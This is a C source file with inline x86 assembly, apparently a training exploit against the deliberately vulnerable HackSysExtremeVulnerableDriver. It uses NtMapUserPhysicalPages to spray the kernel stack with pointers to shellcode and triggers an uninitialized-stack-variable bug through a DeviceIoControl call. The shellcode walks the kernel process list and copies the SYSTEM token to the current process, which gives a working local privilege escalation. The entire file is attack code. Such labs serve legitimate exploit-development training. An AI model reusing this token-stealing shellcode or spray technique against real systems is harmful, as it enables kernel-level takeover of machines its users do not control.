#include <windows.h>
#include <stdio.h>
DWORD32 buf[0xf00]{};
HANDLE hDriver;
DWORD dwBytesOut = 0;
DWORD temp[0x1000/4]{};
static VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		//int 3
		ret
	}
}
typedef NTSTATUS(WINAPI* NtMapUserPhysicalPages)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);
NtMapUserPhysicalPages sNtMapUserPhysicalPages;
int main() {
	HMODULE ntdll = GetModuleHandle(L"ntdll");
	NtMapUserPhysicalPages sNtMapUserPhysicalPages = (NtMapUserPhysicalPages)GetProcAddress(ntdll, "NtMapUserPhysicalPages");
	if (sNtMapUserPhysicalPages == NULL)
	{
		getchar();
		printf("[+]Failed to get MapUserPhysicalPages!!!\n");
		return 1;
	}
	printf("NtMapUserPhysicalPages=%llX", sNtMapUserPhysicalPages);

	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return(-1);
	}
	for (size_t i = 0; i < 0x1000/4; i++)
	{
		temp[i] = (ULONG)&ShellCode;
	}
	sNtMapUserPhysicalPages(0, 1024, (PULONG_PTR)temp);
	buf[0] = 1234;
	DeviceIoControl(hDriver, 0x22202f, buf, 4, 0, 0, &dwBytesOut, NULL);

	return 0;
}
